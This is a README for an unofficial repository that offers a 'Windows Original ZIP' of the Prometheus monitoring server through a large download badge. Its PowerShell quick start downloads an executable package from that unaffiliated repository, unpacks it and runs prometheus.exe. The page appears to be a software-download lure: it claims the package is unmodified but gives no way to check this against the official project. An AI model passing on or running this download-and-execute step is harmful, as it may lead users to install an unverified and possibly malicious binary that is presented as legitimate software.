<div align="center">

# Prometheus — Windows Original ZIP

**A Windows package reference for server and network monitoring with Prometheus.**

[![Download](https://img.shields.io/badge/DOWNLOAD-WINDOWS%20AMD64-16A34A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/PrometheusSoftwares/prometheus-download/releases/latest/download/prometheus-3.15.1-windows-amd64-original.zip)

</div>

> Independent Prometheus package reference. The Release asset contains the original Windows amd64 package without modification. This repository is not affiliated with or endorsed by the Prometheus project.

<a id="what-is-prometheus"></a>
## What is Prometheus?

Prometheus is an open-source monitoring and alerting system for collecting
time-series metrics from servers, network devices, applications, and services.
It uses PromQL for querying metrics and integrates with exporters, Alertmanager,
and visualization tools.

<a id="package-contents"></a>
## Package contents

- `prometheus.exe` — Prometheus monitoring server
- `promtool.exe` — configuration and rule validation utility
- `prometheus.yml` — starter configuration
- `LICENSE` and `NOTICE` — included package files

## Quick start

```powershell
$zip = ".\prometheus-3.15.1-windows-amd64-original.zip"
Invoke-WebRequest "https://github.com/PrometheusSoftwares/prometheus-download/releases/latest/download/prometheus-3.15.1-windows-amd64-original.zip" -OutFile $zip
Expand-Archive $zip .\prometheus
cd .\prometheus\prometheus-3.15.1.windows-amd64
.\prometheus.exe --config.file=prometheus.yml
```

Prometheus reads scrape targets from `prometheus.yml`. For server metrics,
Node Exporter is commonly used; for network devices, an SNMP exporter can
provide metrics for Prometheus to scrape.

Use Prometheus only on systems and networks that you own or are authorized to
monitor.
